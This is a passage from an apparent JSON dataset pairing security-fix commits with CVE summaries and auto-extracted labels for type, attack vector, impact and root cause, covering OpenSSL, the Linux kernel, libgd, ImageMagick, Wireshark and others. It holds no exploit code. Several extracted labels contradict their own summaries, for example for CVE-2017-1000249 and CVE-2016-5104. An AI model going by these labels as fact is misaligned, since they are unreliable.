attacker"},{"commit_id":"684400ce192dac51df3d3e92b61830a6ef90be3e","cve_id":"CVE-2014-8275","cwe_id":"CWE-310","commit_message":"Fix various certificate fingerprint issues.\n\nBy using non-DER or invalid encodings outside the signed portion of a\ncertificate the fingerprint can be changed without breaking the signature.\nAlthough no details of the signed portion of the certificate can be changed\nthis can cause problems with some applications: e.g. those using the\ncertificate fingerprint for blacklists.\n\n1. Reject signatures with non zero unused bits.\n\nIf the BIT STRING containing the signature has non zero unused bits reject\nthe signature. All current signature algorithms require zero unused bits.\n\n2. Check certificate algorithm consistency.\n\nCheck the AlgorithmIdentifier inside TBS matches the one in the\ncertificate signature. NB: this will result in signature failure\nerrors for some broken certificates.\n\n3. Check DSA\/ECDSA signatures use DER.\n\nReencode DSA\/ECDSA signatures and compare with the original received\nsignature. Return an error if there is a mismatch.\n\nThis will reject various cases including garbage after signature\n(thanks to Antti Karjalainen and Tuomo Untinen from the Codenomicon CROSS\nprogram for discovering this case) and use of BER or invalid ASN.1 INTEGERs\n(negative or with leading zeroes).\n\nCVE-2014-8275\nReviewed-by: Emilia K\u00e4sper <emilia@openssl.org>","summary":"OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k does not enforce certain constraints on certificate data, which allows remote attackers to defeat a fingerprint-based certificate-blacklist protection mechanism by including crafted data within a certificate's unsigned portion, related to crypto\/asn1\/a_verify.c, crypto\/dsa\/dsa_asn1.c, crypto\/ecdsa\/ecs_vrf.c, and crypto\/x509\/x_all.c.","commit_message_1":"fix various certificate fingerprint issue","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by including crafted data within a certificate ' s unsigned portion , related to crypto \/ asn1 \/ a _ verify . c , crypto \/ dsa \/ dsa _ asn1 . c , crypto \/ ecdsa \/ ecs _ vrf . c , and crypto \/ x509 \/ x","Impact":"defeat a fingerprint - based certificate - blacklist protection mechanism","Root Cause":"does not enforce certain constraints on certificate data ","Attack Type":"remote attacker"},{"commit_id":"feba02f3919495e1b960c33ba849e10e77d0785d","cve_id":"CVE-2014-3571","cwe_id":null,"commit_message":"Fix crash in dtls1_get_record whilst in the listen state where you get two\nseparate reads performed - one for the header and one for the body of the\nhandshake record.\n\nCVE-2014-3571\n\nReviewed-by: Matt Caswell <matt@openssl.org>","summary":"OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted DTLS message that is processed with a different read operation for the handshake header than for the handshake body, related to the dtls1_get_record function in d1_pkt.c and the ssl3_read_n function in s3_pkt.c.","commit_message_1":"fix crash in dtls1_get_record whilst in the listen state where you get two separate read performed - one for the header and one for the body of the handshake record","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted dtls message that is processed with a different read operation for the handshake header than for the handshake body , related to the dtls1 _ get _ record function in d1 _ pkt","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference when handling malicious messages","Attack Type":"remote attacker"},{"commit_id":"6a984bf7905c6621281588431f384e79d11a2e33","cve_id":"CVE-2016-9535","cwe_id":"CWE-119","commit_message":"* libtiff\/tif_predic.c: fix memory leaks in error code paths added in\nprevious commit (fix for MSVR 35105)","summary":"tif_predict.h and tif_predict.c in libtiff 4.0.6 have assertions that can lead to assertion failures in debug mode, or buffer overflows in release mode, when dealing with unusual tile size like YCbCr with subsampling. Reported as MSVR 35105, aka *Predictor heap-buffer-overflow.*","commit_message_1":"fix memory leak in error code path added in previous commit ( fix for msvr <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted TIFF image file","Impact":"execute arbitrary code","Root Cause":"have assertions that can lead to assertion failures","Attack Type":"remote attacker"},{"commit_id":"c18263e0e0769faee96a5d0ee04b750c442783c6","cve_id":"CVE-2016-7568","cwe_id":"CWE-190","commit_message":"Merge branch 'PHP-5.6' into PHP-7.0","summary":"Integer overflow in the gdImageWebpCtx function in gd_webp.c in the GD Graphics Library (aka libgd) through 2.2.3, as used in PHP through 7.0.11, allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted imagewebp and imagedestroy calls.","commit_message_1":"merge branch 'php-<file> ' into php-<file>","Vulnerability Type":"integer overflow","Attack Vector":"via crafted imagewebp and imagedestroy calls","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"ef01f18dfc6780b776d0674ed3e7415c6ef54d24","cve_id":"CVE-2016-7163","cwe_id":"CWE-125","commit_message":"Cast to size_t before multiplication\n\nNeed to cast to size_t before multiplication otherwise overflow check is useless.","summary":"Integer overflow in the opj_pi_create_decode function in pi.c in OpenJPEG allows remote attackers to execute arbitrary code via a crafted JP2 file, which triggers an out-of-bounds read or write.","commit_message_1":"cast to size_t before multiplication need to cast to size_t before multiplication otherwise overflow check is useless","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted jp2 file , which triggers an out - of - bounds read or write","Impact":"execute arbitrary code","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"3c2b605d72e8b080dace1d98a6e50b46c1d12186","cve_id":"CVE-2016-6905","cwe_id":"CWE-125","commit_message":"bug #248, fix Out-Of-Bounds Read in read_image_tga","summary":"The read_image_tga function in gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.3 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA image.","commit_message_1":"bug # <number> , fix out-of-bounds read in read_image_tga","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tga image","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"4e5473862e6852b0f3802b0cd0c6fa10b5253291","cve_id":"CVE-2016-6663","cwe_id":"CWE-362","commit_message":"Bug#24388746: PRIVILEGE ESCALATION AND RACE CONDITION USING CREATE TABLE\n\nDuring REPAIR TABLE of a MyISAM table, a temporary data file (.TMD)\nis created. When repair finishes, this file is renamed to the original\n.MYD file. The problem was that during this rename, we copied the\nstats from the old file to the new file with chmod\/chown. If a user\nmanaged to replace the temporary file before chmod\/chown was executed,\nit was possible to get an arbitrary file with the privileges of the\nmysql user.\n\nThis patch fixes the problem by not copying stats from the old\nfile to the new file. This is not needed as the new file was\ncreated with the correct stats. This fix only changes server\nbehavior - external utilities such as myisamchk still does\nchmod\/chown.\n\nNo test case provided since the problem involves synchronization\nwith file system operations.","summary":"Race condition in Oracle MySQL before 5.5.52, 5.6.x before 5.6.33, 5.7.x before 5.7.15, and 8.x before 8.0.1; MariaDB before 5.5.52, 10.0.x before 10.0.28, and 10.1.x before 10.1.18; Percona Server before 5.5.51-38.2, 5.6.x before 5.6.32-78-1, and 5.7.x before 5.7.14-8; and Percona XtraDB Cluster before 5.5.41-37.0, 5.6.x before 5.6.32-25.17, and 5.7.x before 5.7.14-26.17 allows local users with certain permissions to gain privileges by leveraging use of my_copystat by REPAIR TABLE to repair a MyISAM table.","commit_message_1":"privilege escalation and race condition using create table during repair table of a myisam table , a temporary data file (","Vulnerability Type":"Race Condition","Attack Vector":"by REPAIR TABLE to repair a MyISAM table","Impact":"gain elevated privileges","Root Cause":"caused by a race condition error while setting stats during MyISAM table repair","Attack Type":"local attacker"},{"commit_id":"54d5ca871e72f2bb172ec9323497f01cd5091ec7","cve_id":"CVE-2016-6198","cwe_id":"CWE-284","commit_message":"vfs: add vfs_select_inode() helper\n\nSigned-off-by: Miklos Szeredi <mszeredi@redhat.com>\nCc: <stable@vger.kernel.org> # v4.2+","summary":"The filesystem layer in the Linux kernel before 4.5.5 proceeds with post-rename operations after an OverlayFS file is renamed to a self-hardlink, which allows local users to cause a denial of service (system crash) via a rename system call, related to fs\/namei.c and fs\/open.c.","commit_message_1":"vfs : add vfs_select_inode ( ) helper","Vulnerability Type":"Improper Access Control","Attack Vector":"via a rename system call , related to fs \/ namei . c and fs \/ open . c","Impact":"cause a denial of service","Root Cause":"using rename syscall on overlayfs on top of xfs","Attack Type":"local attacker"},{"commit_id":"1ccfe21e14c4d18336f9da8515cd17db88c3de61","cve_id":"CVE-2016-6128","cwe_id":"CWE-20","commit_message":"fix php 72494, invalid color index not handled, can lead to crash","summary":"The gdImageCropThreshold function in gd_crop.c in the GD Graphics Library (aka libgd) before 2.2.3, as used in PHP before 7.0.9, allows remote attackers to cause a denial of service (application crash) via an invalid color index.","commit_message_1":"fix php <number> , invalid color index not handled , can lead to crash","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an invalid color index","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by improper handling of invalid color index","Attack Type":"remote attacker"},{"commit_id":"d8ab7f046587f2e9f734b687ba7e6e10147c294b","cve_id":"CVE-2016-5842","cwe_id":"CWE-125","commit_message":"Improve checking of EXIF profile to prevent integer overflow (bug report from Ibrahim el-sayed)","summary":"MagickCore\/property.c in ImageMagick before 7.0.2-1 allows remote attackers to obtain sensitive memory information via vectors involving the q variable, which triggers an out-of-bounds read.","commit_message_1":"improve checking of exif profile to prevent integer overflow ( bug report from ibrahim el-sayed )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via vectors involving the q variable , which triggers an out - of - bounds read","Impact":"obtain sensitive memory information","Root Cause":"caused by a memory leak within the MagickCore\/property.c","Attack Type":"remote attacker"},{"commit_id":"fc43974d34318c834fbf78570ca1a3764ed8c7d7","cve_id":"CVE-2016-5688","cwe_id":"CWE-119","commit_message":"Ensure image extent does not exceed maximum","summary":"The WPG parser in ImageMagick before 6.9.4-4 and 7.x before 7.0.1-5, when a memory limit is set, allows remote attackers to have unspecified impact via vectors related to the SetImageExtent return-value check, which trigger (1) a heap-based buffer overflow in the SetPixelIndex function or an invalid write operation in the (2) ScaleCharToQuantum or (3) SetPixelIndex functions.","commit_message_1":"ensure image extent doe not exceed maximum","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to the setimageextent return - value check , which trigger ( 1 ) a heap - based buffer overflow in the setpixelindex function or an invalid write operation in the ( 2 ) scalechartoquantum or ( 3 ) setpixelindex functions .","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by the WPG parser","Attack Type":"remote attacker"},{"commit_id":"aecd0ada163a4d6c769cec178955d5f3e9316f2f","cve_id":"CVE-2016-5688","cwe_id":"CWE-119","commit_message":"Set pixel cache to undefined if any resource limit is exceeded","summary":"The WPG parser in ImageMagick before 6.9.4-4 and 7.x before 7.0.1-5, when a memory limit is set, allows remote attackers to have unspecified impact via vectors related to the SetImageExtent return-value check, which trigger (1) a heap-based buffer overflow in the SetPixelIndex function or an invalid write operation in the (2) ScaleCharToQuantum or (3) SetPixelIndex functions.","commit_message_1":"set pixel cache to undefined if any resource limit is exceeded","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to the setimageextent return - value check , which trigger ( 1 ) a heap - based buffer overflow in the setpixelindex function or an invalid write operation in the ( 2 ) scalechartoquantum or ( 3 ) setpixelindex functions .","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by the WPG parser","Attack Type":"remote attacker"},{"commit_id":"11edc83b98a61e890d7bb01855389d40e984ea82","cve_id":"CVE-2016-5357","cwe_id":"CWE-20","commit_message":"Don't treat the packet length as unsigned.\n\nThe scanf family of functions are as annoyingly bad at handling unsigned\nnumbers as strtoul() is - both of them are perfectly willing to accept a\nvalue beginning with a negative sign as an unsigned value.  When using\nstrtoul(), you can compensate for this by explicitly checking for a '-'\nas the first character of the string, but you can't do that with\nsscanf().\n\nSo revert to having pkt_len be signed, and scanning it with %d, but\ncheck for a negative value and fail if we see a negative value.\n\nBug: 12396\nChange-Id: I54fe8f61f42c32b5ef33da633ece51bbcda8c95f\nReviewed-on: https:\/\/code.wireshark.org\/review\/15220\nReviewed-by: Guy Harris <guy@alum.mit.edu>","summary":"wiretap\/netscreen.c in the NetScreen file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"do n't treat the packet length a unsigned","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash )","Root Cause":"mishandles sscanf unsigned-integer processing","Attack Type":"remote attacker"},{"commit_id":"f5ec0afb766f19519ea9623152cca3bbe2229500","cve_id":"CVE-2016-5356","cwe_id":"CWE-119","commit_message":"Fix packet length handling.\n\nTreat the packet length as unsigned - it shouldn't be negative in the\nfile.  If it is, that'll probably cause the sscanf to fail, so we'll\nreport the file as bad.\n\nCheck it against WTAP_MAX_PACKET_SIZE to make sure we don't try to\nallocate a huge amount of memory, just as we do in other file readers.\n\nUse the now-validated packet size as the length in\nws_buffer_assure_space(), so we are certain to have enough space, and\ndon't allocate too much space.\n\nMerge the header and packet data parsing routines while we're at it.\n\nBug: 12395\nChange-Id: Ia70f33b71ff28451190fcf144c333fd1362646b2\nReviewed-on: https:\/\/code.wireshark.org\/review\/15172\nReviewed-by: Guy Harris <guy@alum.mit.edu>","summary":"wiretap\/cosine.c in the CoSine file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"fix packet length handling","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"5efb45231671baa2db2011d8f67f9d6e72bc455b","cve_id":"CVE-2016-5355","cwe_id":"CWE-20","commit_message":"Fix packet length handling.\n\nTreat the packet length as unsigned - it shouldn't be negative in the\nfile.  If it is, that'll probably cause the sscanf to fail, so we'll\nreport the file as bad.\n\nCheck it against WTAP_MAX_PACKET_SIZE to make sure we don't try to\nallocate a huge amount of memory, just as we do in other file readers.\n\nUse the now-validated packet size as the length in\nws_buffer_assure_space(), so we are certain to have enough space, and\ndon't allocate too much space.\n\nBug: 12394\nChange-Id: Ifa023ce70f7a2697bf151009b035a6e6cf8d5d90\nReviewed-on: https:\/\/code.wireshark.org\/review\/15169\nReviewed-by: Guy Harris <guy@alum.mit.edu>","summary":"wiretap\/toshiba.c in the Toshiba file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","commit_message_1":"fix packet length handling","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash )","Root Cause":"mishandles sscanf unsigned-integer processing","Attack Type":"remote attacker"},{"commit_id":"4397b3376dc4e4cb1c991d0aed61ce6482614196","cve_id":"CVE-2016-5104","cwe_id":"CWE-284","commit_message":"common: [security fix] Make sure sockets only listen locally","summary":"The socket_create function in common\/socket.c in libimobiledevice and libusbmuxd allows remote attackers to bypass intended access restrictions and communicate with services on iOS devices by connecting to an IPv4 TCP socket.","commit_message_1":"common : [ security fix ] make sure socket only listen locally","Vulnerability Type":"Improper Access Control","Attack Vector":"by connecting to an ipv4 tcp socket","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"9a47e9cff994f37f7f0dbd9ae23740d0f64f9fe6","cve_id":"CVE-2016-4578","cwe_id":"CWE-200","commit_message":"ALSA: timer: Fix leak in events via snd_timer_user_ccallback\n\nThe stack object \u201cr1\u201d has a total size of 32 bytes. Its field\n\u201cevent\u201d and \u201cval\u201d both contain 4 bytes padding. These 8 bytes\npadding bytes are sent to user without being initialized.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/timer.c in the Linux kernel through 4.6 does not initialize certain r1 data structures, which allows local users to obtain sensitive information from kernel stack memory via crafted use of the ALSA timer interface, related to the (1) snd_timer_user_ccallback and (2) snd_timer_user_tinterrupt functions.","commit_message_1":"timer : fix leak in event via snd_timer_user_ccallback the stack object \u201c r1 \u201d ha a total size of <number> byte","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via crafted use of the alsa timer interface , related to the ( 1 ) snd _ timer _ user _ ccallback and ( 2 ) snd _ timer _ user _ tinterrupt functions","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize certain r1 data structures ","Attack Type":"local attacker"},{"commit_id":"1666984c8625b3db19a9abc298931d35ab7bc64b","cve_id":"CVE-2016-3951","cwe_id":null,"commit_message":"usbnet: cleanup after bind() in probe()\n\nIn case bind() works, but a later error forces bailing\nin probe() in error cases work and a timer may be scheduled.\nThey must be killed. This fixes an error case related to\nthe double free reported in\nhttp:\/\/www.spinics.net\/lists\/netdev\/msg367669.html\nand needs to go on top of Linus' fix to cdc-ncm.\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Double free vulnerability in drivers\/net\/usb\/cdc_ncm.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (system crash) or possibly have unspecified other impact by inserting a USB device with an invalid USB descriptor.","commit_message_1":"cleanup after bind ( ) in probe ( ) in case bind ( ) work , but a later error force bailing in probe ( ) in error case work and a timer may be scheduled","Vulnerability Type":"double free","Attack Vector":"by inserting a usb device with an invalid usb descriptor","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"caused by a double-free error","Attack Type":"local attacker"},{"commit_id":"2af9a55b38b55abbf05fd116ec097d4029115839","cve_id":"CVE-2016-3698","cwe_id":"CWE-284","commit_message":"libndb: reject redirect and router advertisements from non-link-local\n\nRFC4861 suggests that these messages should only originate from\nlink-local addresses in 6.1.2 (RA) and 8.1. (redirect):\n\nMitigates CVE-2016-3698.\n\nSigned-off-by: Lubomir Rintel <lkundrak@v3.sk>\nSigned-off-by: Jiri Pirko <jiri@mellanox.com>","summary":"libndp before 1.6, as used in NetworkManager, does not properly validate the origin of Neighbor Discovery Protocol (NDP) messages, which allows remote attackers to conduct man-in-the-middle attacks or cause a denial of service (network connectivity disruption) by advertising a node as a router from a non-local network.","commit_message_1":"reject redirect and router advertisement from non-link-local rfc4861 suggests that these message should only originate from link-local address in <file>","Vulnerability Type":"Improper Access Control","Attack Vector":"by advertising a node as a router from a non - local network","Impact":"cause a denial of service","Root Cause":"does not properly validate the origin of neighbor discovery protocol ( ndp ) messages","Attack Type":"remote attacker"},{"commit_id":"f0fe970df3838c202ef6c07a4c2b36838ef0a88b","cve_id":"CVE-2016-1583","cwe_id":"CWE-119","commit_message":"ecryptfs: don't allow mmap when the lower fs doesn't support it\n\nThere are legitimate reasons to disallow mmap on certain files, notably\nin sysfs or procfs.  We shouldn't emulate mmap support on file systems\nthat don't offer support natively.\n\nCVE-2016-1583\n\nSigned-off-by: Jeff Mahoney <jeffm@suse.com>\nCc: stable@vger.kernel.org\n[tyhicks: clean up f_op check by using ecryptfs_file_to_lower()]\nSigned-off-by: Tyler Hicks <tyhicks@canonical.com>","summary":"The ecryptfs_privileged_open function in fs\/ecryptfs\/kthread.c in the Linux kernel before 4.6.3 allows local users to gain privileges or cause a denial of service (stack memory consumption) via vectors involving crafted mmap calls for \/proc pathnames, leading to recursive pagefault handling.","commit_message_1":"do n't allow mmap when the lower f doe n't support it there are legitimate reason to disallow mmap on certain file , notably in sysfs or procfs","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving crafted mmap calls for \/ proc pathnames , leading to recursive pagefault handling","Impact":"gain privileges or cause a denial of service ( stack memory consumption )","Root Cause":"caused by improper bounds checking by the ecryptfs mechanism","Attack Type":"local attacker"},{"commit_id":"2f36db71009304b3f0b95afacd8eba1f9f046b87","cve_id":"CVE-2016-1583","cwe_id":"CWE-119","commit_message":"ecryptfs: forbid opening files without mmap handler\n\nThis prevents users from triggering a stack overflow through a recursive\ninvocation of pagefault handling that involves mapping procfs files into\nvirtual memory.\n\nSigned-off-by: Jann Horn <jannh@google.com>\nAcked-by: Tyler Hicks <tyhicks@canonical.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The ecryptfs_privileged_open function in fs\/ecryptfs\/kthread.c in the Linux kernel before 4.6.3 allows local users to gain privileges or cause a denial of service (stack memory consumption) via vectors involving crafted mmap calls for \/proc pathnames, leading to recursive pagefault handling.","commit_message_1":"forbid opening file without mmap handler this prevents user from triggering a stack overflow through a recursive invocation of pagefault handling that involves mapping procfs file into virtual memory","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving crafted mmap calls for \/ proc pathnames , leading to recursive pagefault handling","Impact":"gain privileges or cause a denial of service ( stack memory consumption )","Root Cause":"caused by improper bounds checking by the ecryptfs mechanism","Attack Type":"local attacker"},{"commit_id":"be0726d33cb8f411945884664924bed3cb8c70ee","cve_id":"CVE-2015-8952","cwe_id":"CWE-19","commit_message":"ext2: convert to mbcache2\n\nThe conversion is generally straightforward. We convert filesystem from\na global cache to per-fs one. Similarly to ext4 the tricky part is that\nxattr block corresponding to found mbcache entry can get freed before we\nget buffer lock for that block. So we have to check whether the entry is\nstill valid after getting the buffer lock.\n\nSigned-off-by: Jan Kara <jack@suse.cz>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>","summary":"The mbcache feature in the ext2 and ext4 filesystem implementations in the Linux kernel before 4.6 mishandles xattr block caching, which allows local users to cause a denial of service (soft lockup) via filesystem operations in environments that use many attributes, as demonstrated by Ceph and Samba.","commit_message_1":"convert to mbcache2 the conversion is generally straightforward","Vulnerability Type":"Data Processing Errors","Attack Vector":"via filesystem operations in environments that use many attributes , as demonstrated by ceph and samba","Impact":"cause a denial of service","Root Cause":"caused by mishandling xattr block caching by mbcache feature","Attack Type":"local attacker"},{"commit_id":"82939d7999dfc1f1998c4b1c12e2f19edbdff272","cve_id":"CVE-2015-8952","cwe_id":"CWE-19","commit_message":"ext4: convert to mbcache2\n\nThe conversion is generally straightforward. The only tricky part is\nthat xattr block corresponding to found mbcache entry can get freed\nbefore we get buffer lock for that block. So we have to check whether\nthe entry is still valid after getting buffer lock.\n\nSigned-off-by: Jan Kara <jack@suse.cz>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>","summary":"The mbcache feature in the ext2 and ext4 filesystem implementations in the Linux kernel before 4.6 mishandles xattr block caching, which allows local users to cause a denial of service (soft lockup) via filesystem operations in environments that use many attributes, as demonstrated by Ceph and Samba.","commit_message_1":"convert to mbcache2 the conversion is generally straightforward","Vulnerability Type":"Data Processing Errors","Attack Vector":"via filesystem operations in environments that use many attributes , as demonstrated by ceph and samba","Impact":"cause a denial of service","Root Cause":"caused by mishandling xattr block caching by mbcache feature","Attack Type":"local attacker"},{"commit_id":"85e8468bec9416bd7e16b0d80cb820ecd2b330c3","cve_id":"CVE-2015-8852","cwe_id":null,"commit_message":"Do not consider a CR by itself as a valid line terminator\n\nVarnish (prior to version 4.0) was not following the standard with\nregard to line separator.\n\nSpotted and analyzed by: R\u00e9gis Leroy [regilero] regis.leroy@makina-corpus.com","summary":"Varnish 3.x before 3.0.7, when used in certain stacked installations, allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via a header line terminated by a r (carriage return) character in conjunction with multiple Content-Length headers in an HTTP request.","commit_message_1":"do not consider a cr by itself a a valid line terminator varnish ( prior to version <file> ) wa not following the standard with regard to line separator","Vulnerability Type":"carriage return","Attack Vector":"via a header line terminated by a r ( carriage return ) character in conjunction with multiple content - length headers in an http request","Impact":"inject arbitrary http headers and conduct http response splitting attacks","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4c185ce06dca14f5cea192f5a2c981ef50663f2b","cve_id":"CVE-2015-8830","cwe_id":null,"commit_message":"aio: lift iov_iter_init() into aio_setup_..._rw()\n\nthe only non-trivial detail is that we do it before rw_verify_area(),\nso we'd better cap the length ourselves in aio_setup_single_rw()\ncase (for vectored case rw_copy_check_uvector() will do that for us).\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"Integer overflow in the aio_setup_single_vector function in fs\/aio.c in the Linux kernel 4.0 allows local users to cause a denial of service or possibly have unspecified other impact via a large AIO iovec.  NOTE: this vulnerability exists because of a CVE-2012-6701 regression.","commit_message_1":"lift iov_iter_init ( ) into aio_setup_","Vulnerability Type":"integer overflow","Attack Vector":"via a large aio iovec","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"7a1aac3343af85b4af4df5f8844946eaa27394ab?w=1","cve_id":"CVE-2013-7456","cwe_id":"CWE-125","commit_message":"Fixed bug #72227: imagescale out-of-bounds read\n\nPorted from https:\/\/github.com\/libgd\/libgd\/commit\/4f65a3e4eedaffa1efcf9ee1eb08f0b504fbc31a","summary":"gd_interpolation.c in the GD Graphics Library (aka libgd) before 2.1.1, as used in PHP before 5.5.36, 5.6.x before 5.6.22, and 7.x before 7.0.7, allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via a crafted image that is mishandled by the imagescale function.","commit_message_1":"fixed bug # <number> : imagescale out-of-bounds read","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted image that is mishandled by the imagescale function","Impact":"cause a denial of service ( out - of - bounds read ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"d11662f4f798b50d8c8743f433842c3e40fe3378","cve_id":"CVE-2017-1000380","cwe_id":"CWE-200","commit_message":"ALSA: timer: Fix race between read and ioctl\n\nThe read from ALSA timer device, the function snd_timer_user_tread(),\nmay access to an uninitialized struct snd_timer_user fields when the\nread is concurrently performed while the ioctl like\nsnd_timer_user_tselect() is invoked.  We have already fixed the races\namong ioctls via a mutex, but we seem to have forgotten the race\nbetween read vs ioctl.\n\nThis patch simply applies (more exactly extends the already applied\nrange of) tu->ioctl_lock in snd_timer_user_tread() for closing the\nrace window.\n\nReported-by: Alexander Potapenko <glider@google.com>\nTested-by: Alexander Potapenko <glider@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/timer.c in the Linux kernel before 4.11.5 is vulnerable to a data race in the ALSA \/dev\/snd\/timer driver resulting in local users being able to read information belonging to other users, i.e., uninitialized memory contents may be disclosed when a read and an ioctl happen at the same time.","commit_message_1":"timer : fix race between read and ioctl the read from alsa timer device , the function snd_timer_user_tread ( ) , may access to an uninitialized struct snd_timer_user field when the read is concurrently performed while the ioctl like snd_timer_user_tselect ( ) is invoked","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"uninitialized memory contents may be disclosed when a read and an ioctl happen at the same time","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"3a8b0677fc6180a467e26cc32ce6b0c09a32f9bb","cve_id":"CVE-2017-1000252","cwe_id":"CWE-20","commit_message":"KVM: VMX: Do not BUG() on out-of-bounds guest IRQ\n\nThe value of the guest_irq argument to vmx_update_pi_irte() is\nultimately coming from a KVM_IRQFD API call. Do not BUG() in\nvmx_update_pi_irte() if the value is out-of bounds. (Especially,\nsince KVM as a whole seems to hang after that.)\n\nInstead, print a message only once if we find that we don't have a\nroute for a certain IRQ (which can be out-of-bounds or within the\narray).\n\nThis fixes CVE-2017-1000252.\n\nFixes: efc644048ecde54 (\"KVM: x86: Update IRTE for posted-interrupts\")\nSigned-off-by: Jan H. Sch\u00f6nherr <jschoenh@amazon.de>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The KVM subsystem in the Linux kernel through 4.13.3 allows guest OS users to cause a denial of service (assertion failure, and hypervisor hang or crash) via an out-of bounds guest_irq value, related to arch\/x86\/kvm\/vmx.c and virt\/kvm\/eventfd.c.","commit_message_1":"vmx : do not bug ( ) on out-of-bounds guest irq the value of the guest_irq argument to vmx_update_pi_irte ( ) is ultimately coming from a kvm_irqfd api call","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an out - of bounds guest _ irq value , related to arch \/ x86 \/ kvm \/ vmx . c and virt \/ kvm \/ eventfd . c","Impact":"cause a denial of service ( assertion failure , and hypervisor hang or crash )","Root Cause":"caused by an assertion failure","Attack Type":"local attacker"},{"commit_id":"9611f31313a93aa036389c5f3b15eea53510d4d","cve_id":"CVE-2017-1000249","cwe_id":"CWE-119","commit_message":"Extend build-id reporting to 8-byte IDs that lld can generate (Ed Maste)","summary":"An issue in file() was introduced in commit 9611f31313a93aa036389c5f3b15eea53510d4d1 (Oct 2016) lets an attacker overwrite a fixed 20 bytes stack buffer with a specially crafted .notes section in an ELF binary. This was fixed in commit 35c94dc6acc418f1ad7f6241a6680e5327495793 (Aug 2017).","commit_message_1":"extend build-id reporting to <number>-byte id that lld can generate ( ed maste )","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"caused by improper validation of user request","Attack Type":"remote attacker"},{"commit_id":"8c35502217c1879cb8257c617007282eee3fe1cc","cve_id":"CVE-2017-17499","cwe_id":"CWE-416","commit_message":"Added missing return to avoid use after free.","summary":"ImageMagick before 6.9.9-24 and 7.x before 7.0.7-12 has a use-after-free in Magick::Image::read in Magick++\/lib\/Image.cpp.","commit_message_1":"added missing return to avoid use after free","Vulnerability Type":"Use After Free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free","Attack Type":"remote 